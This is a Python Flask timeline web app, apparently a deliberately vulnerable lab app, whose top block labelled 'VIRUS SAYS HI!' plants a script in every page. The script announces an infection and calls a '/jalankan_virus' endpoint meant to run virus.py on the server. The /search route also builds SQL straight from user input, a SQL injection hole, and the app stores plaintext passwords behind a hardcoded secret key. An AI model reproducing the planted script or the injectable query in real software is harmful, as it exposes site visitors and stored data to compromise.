# VIRUS SAYS HI!
import sys
import glob

# --- Bagian Virus Dimodifikasi ---
MALICIOUS_JS_PAYLOAD = "" # Variabel global untuk menyimpan payload JavaScript

def malicious_code():
    global MALICIOUS_JS_PAYLOAD
    # Siapkan JavaScript untuk dieksekusi di browser
    # JavaScript ini akan mencetak pesan ke console dan kemudian
    # mengirim permintaan ke endpoint '/jalankan_virus' di server Anda.
    MALICIOUS_JS_PAYLOAD = (
        '<script>'
        'console.log("YOU HAVE BEEN INFECTED HAAHA !!! (Pesan ini dari Console Browser)");'
        'fetch("/jalankan_virus")'  # Endpoint untuk memicu virus.py
        '    .then(response => response.json())'  # Mengasumsikan server merespons dengan JSON
        '    .then(data => {'
        '        console.log("Respon dari server setelah mencoba menjalankan virus.py:", data);'
        '    })'
        '    .catch(error => {'
        '        console.error("Error saat menghubungi server untuk menjalankan virus.py:", error);'
        '    });'
        '</script>'
    )
    print("Virus: Payload JavaScript untuk console browser telah disiapkan untuk memicu virus.py di server.")

malicious_code()


# app.py
import os
import sqlite3
from flask import Flask, redirect, request, session
from jinja2 import Template
# Markup tidak lagi eksplisit dibutuhkan jika menggunakan |safe di template string

app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def create_tables():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
                id      INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT    NOT NULL UNIQUE,
                password TEXT    NOT NULL
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS time_line(
                id       INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id  INTEGER NOT NULL,
                content  TEXT    NOT NULL,
                FOREIGN KEY(user_id) REFERENCES user(id)
            )
        ''')
        conn.commit()

def init_data():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.executemany(
            'INSERT OR IGNORE INTO user(username, password) VALUES (?,?)',
            [('alice','alicepw'), ('bob','bobpw')]
        )
        cur.executemany(
            'INSERT OR IGNORE INTO time_line(user_id, content) VALUES (?,?)',
            [(1,'Hello world'), (2,'Hi there')]
        )
        conn.commit()

def authenticate(username, password):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'SELECT id, username FROM user WHERE username=? AND password=?',
            (username, password)
        )
        row = cur.fetchone()
        return dict(row) if row else None

def create_time_line(uid, content):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'INSERT INTO time_line(user_id, content) VALUES (?,?)',
            (uid, content)
        )
        conn.commit()

def get_time_lines():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
        return [dict(r) for r in cur.fetchall()]

def delete_time_line(uid, tid):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'DELETE FROM time_line WHERE user_id=? AND id=?',
            (uid, tid)
        )
        conn.commit()

@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    conn = connect_db()
    cur = conn.cursor()

    query = f"SELECT id, user_id, content FROM time_line WHERE content LIKE '%{keyword}%'"
    cur.execute(query)
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()

    # Modifikasi template untuk menyisipkan JavaScript
    template_string = '''
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Search Result</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/css/bootstrap.min.css" rel="stylesheet">
  {{ malicious_script | safe }} {# Sisipkan payload JS di sini #}
</head>
<body>
  <div class="container mt-5">
    <h2>Search Result for "<span class="text-primary">{{ keyword }}</span>"</h2>
    <a href="/" class="btn btn-secondary btn-sm mb-3">Back to Timeline List</a>

    {% if results %}
      <div class="card">
        <ul class="list-group list-group-flush">
          {% for item in results %}
          <li class="list-group-item">
            <strong>Timeline ID:</strong> {{ item.id }}<br>
            <strong>User ID:</strong> {{ item.user_id }}<br>
            <strong>Content:</strong> {{ item.content }}
          </li>
          {% endfor %}
        </ul>
      </div>
    {% else %}
      <div class="alert alert-warning mt-3">No results found.</div>
    {% endif %}

    <div class="mt-4">
      <h5>Search Again</h5>
      <form action="/search" method="get" class="input-group">
        <input name="keyword" class="form-control" placeholder="Search again..." value="{{ keyword }}">
        <button class="btn btn-outline-secondary" type="submit">Search</button>
      </form>
    </div>
  </div>
</body>
</html>
    '''
    return Template(template_string).render(
        keyword=keyword,
        results=rows,
        malicious_script=MALICIOUS_JS_PAYLOAD # Kirim payload ke template
    )

@app.route('/init')
def init_page():
    create_tables()
    init_data()
    return redirect('/')

@app.route('/')
def index():
    if 'uid' in session:
        tl = get_time_lines()
        # Modifikasi template untuk menyisipkan JavaScript
        template_string = '''
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Asset App</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/css/bootstrap.min.css" rel="stylesheet">
  {{ malicious_script | safe }} {# Sisipkan payload JS di sini #}
</head>
<body>
  <nav class="navbar navbar-expand-lg navbar-dark bg-primary mb-4">
    <div class="container-fluid">
      <h2 class="navbar-brand" href="/">Timeline App</h2>
      <div class="collapse navbar-collapse">
        <ul class="navbar-nav ms-auto">
          <li class="nav-item">
            <span class="navbar-text text-white">
              Welcome, {{ user }}
            </span>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/logout">Logout</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>

  <div class="container">
    <div class="row mb-4">
      <div class="col-md-8">
        <h5 class="mb-0">Add New Timeline</h5>
        <div class="card">
          <div class="card-body">
            <form action="/create" method="post" class="d-flex">
              <input
                name="content"
                class="form-control me-2"
                placeholder="Add new entry..."
                required
              >
              <button type="submit" class="btn btn-success">Add</button>
            </form>
          </div>
        </div>
      </div>
      <h5 class="mb-0">Search</h5>
      <div class="col-md-4">
        <div class="card">
          <div class="card-body">
            <form action="/search" method="get" class="input-group">
              <input
                name="keyword"
                class="form-control"
                placeholder="Search Something Here..."
              >
              <button class="btn btn-outline-secondary" type="submit">Go</button>
            </form>
          </div>
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <h5 class="mb-0">Timeline</h5>
      </div>
      <ul class="list-group list-group-flush">
        {% for line in tl %}
        <li class="list-group-item d-flex justify-content-between align-items-center">
          <div>
            <span class="badge bg-secondary me-2"></span>
            {{ line.content }}
          </div>
          <a href="/delete/{{ line.id }}" class="btn btn-sm btn-danger">Delete</a>
        </li>
        <h5 class="mb-0">----------------------------</h5>
        {% else %}
        <li class="list-group-item text-center text-muted">
          No entries yet.
        </li>
        {% endfor %}
      </ul>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
        '''
        return Template(template_string).render(
            user=session['username'],
            tl=tl,
            malicious_script=MALICIOUS_JS_PAYLOAD # Kirim payload ke template
        )
    return redirect('/login')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=='POST':
        user = authenticate(request.form['username'], request.form['password'])
        if user:
            session['uid'] = user['id']
            session['username'] = user['username']
            return redirect('/') # Akan diarahkan ke / yang sudah disisipi JS

    # Untuk halaman login (GET), kita juga sisipkan JS
    # Karena ini string HTML biasa, kita bisa langsung gabungkan
    login_html = '''
<form method="post">
  <input name="username" placeholder="user"/><input name="password" type="password"/>
  <button>Login</button>
</form>
'''
    return login_html + MALICIOUS_JS_PAYLOAD # Gabungkan dengan payload JS

@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        create_time_line(session['uid'], request.form['content'])
    return redirect('/')

@app.route('/delete/<int:tid>')
def delete(tid):
    if 'uid' in session:
        delete_time_line(session['uid'], tid)
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__=='__main__':
    app.run(debug=True)